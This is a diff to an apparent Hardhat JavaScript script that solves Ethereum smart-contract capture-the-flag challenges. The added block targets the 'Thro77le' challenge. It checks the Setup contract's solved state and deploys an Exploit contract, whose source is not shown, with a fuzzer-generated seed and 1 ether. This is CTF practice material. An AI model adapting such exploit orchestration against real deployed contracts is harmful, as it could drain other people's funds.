@@ -1,4 +1,4 @@
-const { parseEther } = require("ethers/lib/utils");
+const { parseEther, formatUnits } = require("ethers/lib/utils");
 const { ethers, waffle} = require("hardhat");
 const provider = waffle.provider;
 
@@ -248,6 +248,29 @@ async function main() {
         await (await exploit.destroy()).wait();
         await (await exploit.deploy()).wait();
         await (await exploit.destroy()).wait();
+        console.log(author, ":", await setup.isSolved());
+    }
+
+    // Thro77le
+    author = "Thro77le";
+    SETUP = await ethers.getContractFactory("contracts/" + author + "/Setup.sol:Setup");
+    setup = await SETUP.attach("0xBF3e5530aB7Dcba712E3A7fA99463d46eb6a0c8e");
+    challenge = await ethers.getContractAt("contracts/Thro77le/Challenge.sol:Challenge", await setup.challenge());
+    if (challenge.address != "0xd9C72eD9DdeF04D0Ab88aE2403C383Ffbd11a71c")
+    {
+        console.log("address:", challenge.address);
+        throw("error");
+    }
+    solved = await setup.isSolved();
+    console.log(author, ":", solved);
+
+    if (!solved)
+    {   
+        // generated with echidna
+        ctf_seed = "51479216184425723975146308431218947475483327652822635706002660225093881707131";
+        const factory = await ethers.getContractAt("Factory", await setup.factory());
+        const EXPLOIT = await ethers.getContractFactory("contracts/" + author + "/Exploit.sol:Exploit");
+        exploit = await EXPLOIT.deploy(challenge.address, formatUnits(ctf_seed, "wei"), factory.address, {value: parseEther("1")});
         console.log(author, ":", await setup.isSolved());
     }
 }
